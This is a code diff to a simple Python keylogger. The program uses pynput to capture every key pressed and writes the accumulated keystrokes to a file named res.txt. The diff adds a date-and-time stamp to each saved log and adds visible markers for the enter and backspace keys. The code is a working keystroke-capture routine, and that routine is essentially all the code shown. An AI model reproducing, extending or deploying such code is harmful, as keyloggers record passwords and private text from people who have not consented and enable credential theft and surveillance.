@@ -1,5 +1,6 @@
 from time import sleep
 from pynput import keyboard
+from datetime import datetime
 
 global typed
 global final_chars
@@ -13,10 +14,13 @@ def write_to_file():
     global final_chars
     global typed
     
+    now = str(datetime.now())
+    print("now =", now)
+    
     #Join the list and convert to a string
     final_chars = "".join(map(str, typed))
-    final_chars  = final_chars.replace("''", "") 
-     
+    final_chars = final_chars.replace("''", "") 
+    final_chars = final_chars+" -------- date and time : "+now 
     f = open("res.txt", "w")
     f.write(str(final_chars))
     f.close()
@@ -31,9 +35,11 @@ def on_press(key):
     if key == str("Key.space"): # checks for spacebar
         key = (" ")
     elif key == str("Key.enter"): # checks for return
-        key = ("\\")    
+        key = (" \\ ")
+    elif key == str("Key.backspace"): # checks for return
+        key = (" '<-' ")    
     else:
-        pass
+    	pass
 
     typed.append(str(key))
     
